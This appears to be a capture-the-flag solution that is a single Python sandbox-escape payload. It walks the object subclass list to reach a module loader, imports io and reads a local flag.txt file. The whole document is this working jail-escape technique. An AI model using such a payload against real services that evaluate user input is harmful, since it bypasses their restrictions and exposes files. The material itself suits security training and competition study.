Solution:

```
().__class__.__base__.__subclasses__()[120]().load_module('io').open('flag.txt').read()
```
